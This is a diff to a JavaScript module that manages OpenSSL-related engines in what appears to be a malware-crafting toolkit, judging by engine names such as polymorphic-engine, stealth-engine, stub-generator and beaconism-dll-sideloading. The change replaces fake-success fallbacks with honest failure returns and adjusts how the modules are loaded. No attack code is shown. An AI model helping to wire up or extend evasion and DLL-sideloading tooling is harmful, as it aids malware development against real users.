@@ -47,7 +47,8 @@ try {
             return algorithm;
         }
         updateAlgorithmPreference(algorithm, fallback) {
-            return { success: true, message: "OpenSSL operation completed" };
+            console.warn('OpenSSL operation not available - using fallback');
+            return { success: false, error: "OpenSSL not available", message: "OpenSSL operation not available" };
         }
         getOpenSSLAlgorithms() { 
             return [
@@ -84,12 +85,12 @@ try {
             }; 
         }
         async toggleOpenSSLMode(enabled) { 
-            this.config.opensslMode = enabled;
-            return { success: true, enabled }; 
+            console.warn('OpenSSL mode toggle not available - using fallback');
+            return { success: false, error: "OpenSSL not available", enabled: false }; 
         }
         async toggleCustomAlgorithms(enabled) { 
-            this.config.customAlgorithms = enabled;
-            return { success: true, enabled }; 
+            console.warn('Custom algorithms toggle not available - using fallback');
+            return { success: false, error: "OpenSSL not available", enabled: false }; 
         }
     };
 }
@@ -98,13 +99,15 @@ let advancedCrypto, stubGenerator;
 try {
     advancedCrypto = require('./advanced-crypto');
 } catch (e) {
-    advancedCrypto = { process: () => ({ success: true }) };
+    console.warn('Advanced crypto engine not available:', e.message);
+    advancedCrypto = null;
 }
 
 try {
     stubGenerator = require('./stub-generator');
 } catch (e) {
-    stubGenerator = { generate: () => ({ success: true }) };
+    console.warn('Stub generator not available:', e.message);
+    stubGenerator = null;
 }
 
 class OpenSSLManagement extends EventEmitter {
@@ -166,7 +169,7 @@ class OpenSSLManagement extends EventEmitter {
         } catch (error) {
             this.emit('error', { engine: this.name, error: error.message });
             logger.error('Failed to initialize OpenSSL Management:', error);
-            throw error;
+            return { success: false, error: error.message };
         }
     }
 
@@ -299,8 +302,7 @@ class OpenSSLManagement extends EventEmitter {
 
             // Polymorphic Engine
             try {
-                const PolymorphicEngine = require('./polymorphic-engine');
-                const polymorphicEngine = new PolymorphicEngine();
+                const polymorphicEngine = require('./polymorphic-engine');
                 if (polymorphicEngine.initialize) {
                     await polymorphicEngine.initialize();
                 }
@@ -312,8 +314,7 @@ class OpenSSLManagement extends EventEmitter {
 
             // Stealth Engine
             try {
-                const StealthEngine = require('./stealth-engine');
-                const stealthEngine = new StealthEngine();
+                const stealthEngine = require('./stealth-engine');
                 if (stealthEngine.initialize) {
                     await stealthEngine.initialize();
                 }
@@ -348,8 +349,7 @@ class OpenSSLManagement extends EventEmitter {
 
             // Beaconism DLL Sideloading (for DLL encryption)
             try {
-                const BeaconismDLLSideloading = require('./beaconism-dll-sideloading');
-                const beaconismDLL = new BeaconismDLLSideloading();
+                const beaconismDLL = require('./beaconism-dll-sideloading');
                 this.engines.set('beaconism-dll', beaconismDLL);
                 logger.info('Beaconism DLL Sideloading loaded');
             } catch (err) {
@@ -537,7 +537,7 @@ class OpenSSLManagement extends EventEmitter {
             return { success: true, preset: presetName, configuration: preset };
         } catch (error) {
             logger.error("Failed to apply preset " + presetName + ":", error);
-            throw error;
+            return { success: false, error: error.message };
         }
     }
 
